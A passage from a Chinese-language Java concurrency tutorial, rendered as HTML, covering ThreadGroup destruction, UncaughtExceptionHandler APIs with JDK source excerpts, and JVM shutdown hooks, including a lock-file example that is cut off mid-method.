        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>tg1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"group1-t1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ThreadGroup</span> tg2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadGroup</span><span class="token punctuation">(</span><span class="token string">"group2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>tg2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"group2-t1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tg2<span class="token punctuation">.</span><span class="token function">setDaemon</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>tg1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" -- "</span> <span class="token operator">+</span> tg1<span class="token punctuation">.</span><span class="token function">isDestroyed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// false</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>tg2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" -- "</span> <span class="token operator">+</span> tg2<span class="token punctuation">.</span><span class="token function">isDestroyed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true</span>
      
        tg1<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 显示销毁</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>tg1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" -- "</span> <span class="token operator">+</span> tg1<span class="token punctuation">.</span><span class="token function">isDestroyed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>tg2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" -- "</span> <span class="token operator">+</span> tg2<span class="token punctuation">.</span><span class="token function">isDestroyed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Chapter7：Hook线程以及捕获线程执行异常">Chapter7：Hook线程以及捕获线程执行异常</h2>
<h3 id="获取线程运行时异常">获取线程运行时异常</h3>
<h4 id="处理Thread运行时异常API，有四个">处理Thread运行时异常API，有四个</h4>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>public static void  <strong>setDefaultUncaughtExceptionHandler</strong>(Thread.UncaughtExceptionHandler eh)</td>
<td>设置全局的UncaughtExceptionHandler</td>
</tr>
<tr>
<td>public static  Thread.UncaughtExceptionHandler <strong>getDefaultUncaughtExceptionHandler</strong>()</td>
<td>获取全局的UncaughtExceptionHandler</td>
</tr>
<tr>
<td>public void  setUncaughtExceptionHandler(Thread.UncaughtExceptionHandler eh)</td>
<td>为某个特定线程指定UncaughtExceptionHandler</td>
</tr>
<tr>
<td>public Thread.UncaughtExceptionHandler  getUncaughtExceptionHandler()</td>
<td>获取某个特定线程指定UncaughtExceptionHandler</td>
</tr>
</tbody>
</table>
<p>其中UncaughtExceptionHandler 是一个FunctionalInterface接口，仅包含一个抽象方法。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@FunctionalInterface</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UncaughtExceptionHandler</span> <span class="token punctuation">{</span>
  <span class="token comment">/**
         * Method invoked when the given thread terminates due to the
         * given uncaught exception.
         * &lt;p&gt;Any exception thrown by this method will be ignored by the
         * Java Virtual Machine.
         * @param t the thread
         * @param e the exception
         */</span>
  <span class="token keyword">void</span> <span class="token function">uncaughtException</span><span class="token punctuation">(</span><span class="token class-name">Thread</span> t<span class="token punctuation">,</span> <span class="token class-name">Throwable</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该回调接口会被<code>Thread</code>和<code>dispatchUncaughtException</code>调用。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * Dispatch an uncaught exception to the handler. This method is
 * intended to be called only by the JVM.
 */</span>
<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">dispatchUncaughtException</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">getUncaughtExceptionHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">uncaughtException</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="UncaughtExceptionHandler实例">UncaughtExceptionHandler实例</h4>
<p>测试类</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CaptureThreadException</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token comment">// 1. 设置回调接口</span>
        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">setDefaultUncaughtExceptionHandler</span><span class="token punctuation">(</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" ----- occur exception："</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token comment">// 2. 抛出运行时异常</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Thread-0 ----- occur exception：/ by zero
java.lang.ArithmeticException: / by zero
	at com.hots.chapter7.CaptureThreadException.lambda<span class="token variable">$main</span><span class="token variable">$1</span><span class="token punctuation">(</span>CaptureThreadException.java:20<span class="token punctuation">)</span>
	at java.lang.Thread.run<span class="token punctuation">(</span>Thread.java:748<span class="token punctuation">)</span>

Process finished with <span class="token builtin class-name">exit</span> code <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="UncaughtExceptionHandler源码分析">UncaughtExceptionHandler源码分析</h4>
<ol>
<li>
<p>获取Thread的UncaughtExceptionHandler</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">dispatchUncaughtException</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">getUncaughtExceptionHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">uncaughtException</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>Thread未设置UncaughtExceptionHandler，则找ThreadGroup获取</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">UncaughtExceptionHandler</span> <span class="token function">getUncaughtExceptionHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> uncaughtExceptionHandler <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span>
    uncaughtExceptionHandler <span class="token operator">:</span> group<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>ThreadGroup 是 Thread.UncaughtExceptionHandler 的实现类</p>
</blockquote>
</li>
<li>
<p>ThreadGroup的uncaughtException</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">uncaughtException</span><span class="token punctuation">(</span><span class="token class-name">Thread</span> t<span class="token punctuation">,</span> <span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		parent<span class="token punctuation">.</span><span class="token function">uncaughtException</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用父ThreadGroup的uncaughtException</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		<span class="token class-name">Thread<span class="token punctuation">.</span>UncaughtExceptionHandler</span> ueh <span class="token operator">=</span>
			<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">getDefaultUncaughtExceptionHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
		<span class="token keyword">if</span> <span class="token punctuation">(</span>ueh <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			ueh<span class="token punctuation">.</span><span class="token function">uncaughtException</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用全局默认的UncaughtExceptionHandler</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>e <span class="token keyword">instanceof</span> <span class="token class-name">ThreadDeath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Exception in thread \""</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将异常的堆栈信息定向到System.err中</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<pre class="mermaid">   graph LR
   A[线程异常] --&gt;  B(MainGroup) --&gt; C(System Group) --&gt; D[System.err]</pre>
<h3 id="注入Hook线程">注入Hook线程</h3>
<h4 id="Hook线程概念">Hook线程概念</h4>
<p>JVM进程的退出是由于JVM进程中没<strong>有活跃的非守护线程</strong>，或者收到了<strong>系统中断信号</strong>。</p>
<p><strong>向JVM程序注入一个Hook线程，在JVM进程退出的时候，Hook线程会启动执行。</strong></p>
<p>通过Runtime可以为JVM注人多个Hook线程。</p>
<h4 id="Linux-模拟Hook简单调用">Linux 模拟Hook简单调用</h4>
<p>==Runtime.getRuntime().addShutdownHook(Thread hook));==</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># mkdir /root/java</span>
<span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># vi ExitCapture.java #内容如下</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExitCapture</span><span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
    
		<span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addShutdownHook</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
			<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" exiting......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// 进程down之前的安全处理措施</span>
			<span class="token function">notifyAndRelease</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
		<span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token operator">++</span>i<span class="token punctuation">;</span>
			<span class="token keyword">try</span><span class="token punctuation">{</span>
				<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1_000L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" working...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&gt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	
	<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">notifyAndRelease</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" notify other matchine and release resource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">try</span> <span class="token punctuation">{</span>
			<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1_000L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>	
		<span class="token punctuation">}</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"finish exit."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># javac ExitCapture.java</span>
<span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># java ExitCapture</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<blockquote>
<p># 后台运行，日志记录到nohup.out文件</p>
<p>nohup java -cp . ExitCapture &amp;</p>
</blockquote>
<p>10秒后程序退出 / Ctrl+C 退出程序 / kill 进程号</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># java ExitCapture  </span>
main working<span class="token punctuation">..</span><span class="token punctuation">..</span>
main working<span class="token punctuation">..</span><span class="token punctuation">..</span>
main working<span class="token punctuation">..</span><span class="token punctuation">..</span>
main working<span class="token punctuation">..</span><span class="token punctuation">..</span>
main working<span class="token punctuation">..</span><span class="token punctuation">..</span>
main working<span class="token punctuation">..</span><span class="token punctuation">..</span>
^CThread-0 exiting<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
Thread-0 notify other matchine and release resource
main working<span class="token punctuation">..</span><span class="token punctuation">..</span>
Thread-0finish exit.
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>+  Exit <span class="token number">1</span>              <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>kill -9 进程号 会直接退出，钩子程序不会执行。</p>
</blockquote>
<h4 id="Hook线程实际应用举例">Hook线程实际应用举例</h4>
<p>在我们的开发中经常会遇到Hook线程，比如为了防止某个程序被重复启动，在进程启动时会创建一个文件，进程收到中断信号的时候会删除这个lock文件，我们在MySQL服务器、zookeeper、kafka等系统中都能看到lock文件的存在。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PreventDuplicated</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">LOCK_PATH</span> <span class="token operator">=</span> <span class="token string">"E:\\Downloads"</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">LOCK_FILE</span> <span class="token operator">=</span> <span class="token string">".lock"</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">PERMISSIONS</span> <span class="token operator">=</span> <span class="token string">"rw-------"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addShutdownHook</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token comment">// 程序退出，删除lock文件</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"deal program shutdown..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">getLockFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 判断Lock文件，存在，抛重复执行异常，不存在继续</span>
        <span class="token function">checkLockFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//程序执行</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">20_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkLockFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Path</span> path <span class="token operator">=</span> <span class="token function">getLockFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"The program already running."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
